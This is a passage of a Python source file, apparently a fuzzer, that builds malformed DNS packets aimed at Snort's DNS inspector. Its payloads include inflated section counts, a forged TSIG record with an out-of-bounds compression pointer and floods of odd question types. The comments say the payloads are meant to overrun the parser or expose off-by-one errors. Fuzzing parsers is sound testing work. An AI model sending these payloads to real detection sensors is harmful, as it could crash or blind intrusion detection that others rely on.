        # volume pressure without per-record overflow to stress different code path.
        n_per_record = 1400
        rdata = b'\x01x' * n_per_record
        body = question
        for _ in range(8):
            body += b'\xc0\x0c' + struct.pack("!HHIH", 16, 1, 300, len(rdata)) + rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 8, 0, 0)
        dns_msg = (header + body)[:65535]
        return struct.pack("!H", len(dns_msg)) + dns_msg

    else:
        n_entries = 8300
        rdata = b'\x01x' * n_entries
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 16, 1, 300, len(rdata)) + rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        dns_msg = (header + question + answer)[:65535]
        return struct.pack("!H", len(dns_msg)) + dns_msg


def build_dns_dynamic_update(anomaly: str = "zone_bomb") -> bytes:
    """DNS Dynamic Update (RFC 2136) mutations.
    Opcode=5 targets a rarely-exercised parser path in Snort's DNS inspector.
    Zone section uses qdcount, prerequisite uses ancount, update uses nscount."""
    tid = random.randint(0, 0xFFFF)
    # Opcode=5 (UPDATE), flags: QR=0, opcode=5
    update_flags = (5 & 0xF) << 11

    zone_name = _encode_name("example.com")
    zone_rr = zone_name + struct.pack("!HH", 6, 1)  # SOA, IN

    if anomaly == "zone_bomb":
        # qdcount=0xFFFF zones, but only 1 present. Parser iterates 65535 times
        # over the zone section, overrunning the packet after the first zone.
        header = struct.pack("!HHHHHH", tid, update_flags, 0xFFFF, 0, 0, 0)
        return header + zone_rr

    elif anomaly == "prereq_type_confusion":
        # Prerequisite section (ancount) with RR type=ANY (255), class=NONE (254).
        # Snort's DNS parser may not handle class=NONE which is specific to UPDATE.
        # ancount=200 prereqs → rapid iteration over non-standard class values.
        header = struct.pack("!HHHHHH", tid, update_flags, 1, 200, 0, 0)
        body = zone_rr
        for _ in range(200):
            name = _encode_name(f"test{random.randint(0,9999)}.example.com")
            body += name + struct.pack("!HHIH", 255, 254, 0, 0)
        return (header + body)[:65535]

    elif anomaly == "update_delete_all":
        # Update section deletes all RRsets (class=ANY, type=ANY, rdlength=0).
        # 500 delete-all entries force Snort through the update-section parser loop
        # with zero-length RDATA — tests off-by-one in "skip RDATA" advancement.
        header = struct.pack("!HHHHHH", tid, update_flags, 1, 0, 500, 0)
        body = zone_rr
        for _ in range(500):
            name = _encode_name(f"del{random.randint(0,9999)}.example.com")
            body += name + struct.pack("!HHIH", 255, 255, 0, 0)
        return (header + body)[:65535]

    elif anomaly == "mixed_sections_overflow":
        # All four sections populated with conflicting counts.
        # qdcount=1 (zone), ancount=0xFFFF (prereq), nscount=0xFFFF (update),
        # arcount=0xFFFF (additional). Only real data in zone + 1 prereq.
        header = struct.pack("!HHHHHH", tid, update_flags, 1, 0xFFFF, 0xFFFF, 0xFFFF)
        prereq = _encode_name("a.example.com") + struct.pack("!HHIH", 1, 1, 0, 4) + b'\x7f\x00\x00\x01'
        return header + zone_rr + prereq

    elif anomaly == "tsig_forged":
        # UPDATE with a forged TSIG record (type=250) in additional section.
        # TSIG algorithm name is a compression pointer to OOB offset.
        # arcount=1, the TSIG record has algorithm=\xc0\xff (OOB ptr).
        header = struct.pack("!HHHHHH", tid, update_flags, 1, 0, 0, 1)
        tsig_name = _encode_name("_tsig.example.com")
        # TSIG RDATA: algorithm(name) + time(6) + fudge(2) + mac_size(2) + mac + orig_id(2) + error(2) + other_len(2)
        alg_name = b'\xc0\xff'  # OOB compression pointer
        time_signed = struct.pack("!HI", 0, 0)  # 6 bytes (2+4)
        fudge = struct.pack("!H", 300)
        mac = b'\xde\xad' * 16  # 32-byte fake MAC
        mac_size = struct.pack("!H", len(mac))
        tsig_rdata = alg_name + time_signed + fudge + mac_size + mac + struct.pack("!HHH", tid, 0, 0)
        tsig_rr = tsig_name + struct.pack("!HHIH", 250, 255, 0, len(tsig_rdata)) + tsig_rdata
        return header + zone_rr + tsig_rr

    else:
        return build_dns_dynamic_update("zone_bomb")


def build_multi_query_storm(anomaly: str = "type_confusion") -> bytes:
    """Multiple questions per packet with conflicting/unusual types.
    Stresses Snort's per-question iteration and type-specific dispatch."""
    tid = random.randint(0, 0xFFFF)

    if anomaly == "type_confusion":
        # 50 questions each with a different QTYPE including rare types.
        # Forces Snort through every branch of its QTYPE dispatch table per packet.
        qtypes = [1, 2, 5, 6, 12, 15, 16, 28, 33, 35, 36, 41, 43, 46, 47, 48, 50,
                  52, 99, 249, 250, 251, 252, 253, 255, 256, 257, 32768, 32769, 65535]
        n = len(qtypes)
        header = struct.pack("!HHHHHH", tid, 0x0100, n, 0, 0, 0)
        body = b''
        for qt in qtypes:
            body += _encode_name(f"q{qt}.example.com") + struct.pack("!HH", qt, 1)
        return header + body

    elif anomaly == "class_chaos":
        # 30 questions with class=CH (3, Chaosnet) and class=HS (4, Hesiod).
        # These are valid but rarely tested classes that may take unusual code paths.
        n = 30
        header = struct.pack("!HHHHHH", tid, 0x0100, n, 0, 0, 0)
        body = b''
        for i in range(n):
            qclass = random.choice([3, 4, 254, 255])  # CH, HS, NONE, ANY
            body += _encode_name(f"c{i}.example.com") + struct.pack("!HH", 1, qclass)
        return header + body

    elif anomaly == "qdcount_type_mismatch":
        # qdcount=100, but questions alternate between A (1) and OPT (41).
        # OPT is only valid in additional section — putting it in questions
        # confuses parsers that dispatch on type before checking section context.
        n = 100
        header = struct.pack("!HHHHHH", tid, 0x0100, n, 0, 0, 0)
        body = b''
        for i in range(n):
            qtype = 41 if i % 2 == 0 else 1
            body += _encode_name(f"x{i}.test.com") + struct.pack("!HH", qtype, 1)
        return (header + body)[:65535]

    elif anomaly == "null_name_queries":
        # 200 questions with empty name (just \x00 root label), type=ANY, class=ANY.
        # Tests parser's handling of root-label queries at volume.
        n = 200
        header = struct.pack("!HHHHHH", tid, 0x0100, n, 0, 0, 0)
        body = b'\x00' + struct.pack("!HH", 255, 255)  # root, ANY, ANY
        body = body * n
        return (header + body)[:65535]

    elif anomaly == "mixed_ptr_inline":
        # Questions alternate between inline names and compression pointers
        # to each other, creating a web of cross-references within the question section.
        n = 40
        header = struct.pack("!HHHHHH", tid, 0x0100, n, 0, 0, 0)
        body = _encode_name("anchor.example.com") + struct.pack("!HH", 1, 1)
        for i in range(1, n):
            if i % 3 == 0:
                # Point back to the anchor name at offset 12
                body += struct.pack("!H", 0xC000 | 12) + struct.pack("!HH", random.randint(1, 255), 1)
            else:
                body += _encode_name(f"q{i}.test.com") + struct.pack("!HH", random.choice([1, 28, 16, 5]), 1)
        return (header + body)[:65535]

    else:
        return build_multi_query_storm("type_confusion")
